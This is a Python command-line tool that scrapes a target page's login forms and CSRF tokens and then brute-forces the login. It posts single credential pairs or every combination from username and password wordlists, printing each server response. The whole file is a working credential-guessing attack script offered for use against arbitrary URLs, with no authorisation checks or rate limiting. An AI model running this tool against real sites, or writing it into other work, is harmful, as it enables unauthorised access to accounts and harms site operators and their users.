import requests
from bs4 import BeautifulSoup
import argparse

def analyze_page(url):
    print(f"Analyzing {url} for login forms and CSRF tokens...")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    forms = soup.find_all('form')
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get')
        inputs = form.find_all('input')

        form_info = {
            'action': action,
            'method': method,
            'inputs': {input.get('name'): input.get('type', 'text') for input in inputs}
        }

        print(f"Found form: {form_info}")
        for name, type in form_info['inputs'].items():
            print(f"Input field: {name} (type: {type})")

        csrf_token = next((input.get('value') for input in inputs if 'csrf' in input.get('name', '').lower()), None)
        if csrf_token:
            print(f"Found CSRF token: {csrf_token}")
        else:
            print("No CSRF token found.")

    if not forms:
        print("No forms found on the page.")
    else:
        print("Analysis complete. Choose your attack method.")

def brute_force_single(url, username, password):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find('form')
    action = form.get('action')
    inputs = form.find_all('input')

    form_data = {}
    for input in inputs:
        if input.get('type') == 'text':
            form_data[input.get('name')] = username
        elif input.get('type') == 'password':
            form_data[input.get('name')] = password
        elif input.get('name') and 'csrf' in input.get('name').lower():
            form_data[input.get('name')] = input.get('value')

    form_action = action if action.startswith('http') else url + action
    response = requests.post(form_action, data=form_data)
    print(f"Attempted login with {username}:{password}")
    print("Response:", response.text[:1000])  # Print first 1000 characters of response

def brute_force_list(url, user_list, pass_list):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find('form')
    action = form.get('action')
    inputs = form.find_all('input')

    form_action = action if action.startswith('http') else url + action
    for username in open(user_list):
        for password in open(pass_list):
            form_data = {}
            for input in inputs:
                if input.get('type') == 'text':
                    form_data[input.get('name')] = username.strip()
                elif input.get('type') == 'password':
                    form_data[input.get('name')] = password.strip()
                elif input.get('name') and 'csrf' in input.get('name').lower():
                    form_data[input.get('name')] = input.get('value')

            response = requests.post(form_action, data=form_data)
            print(f"Attempted login with {username.strip()}:{password.strip()}")
            print("Response:", response.text[:1000])  # Print first 1000 characters of response

def main():
    parser = argparse.ArgumentParser(description='Web login form analyzer and brute-force tool')
    parser.add_argument('url', help='URL of the target login page')
    parser.add_argument('-aa', action='store_true', help='Analyze the login form and detect CSRF tokens')
    parser.add_argument('-u', help='Single username')
    parser.add_argument('-p', help='Single password')
    parser.add_argument('-U', help='Username list file')
    parser.add_argument('-P', help='Password list file')
    args = parser.parse_args()

    if args.aa:
        analyze_page(args.url)
    
    if args.u and args.p:
        brute_force_single(args.url, args.u, args.p)
    
    if args.U and args.P:
        brute_force_list(args.url, args.U, args.P)

if __name__ == '__main__':
    main()
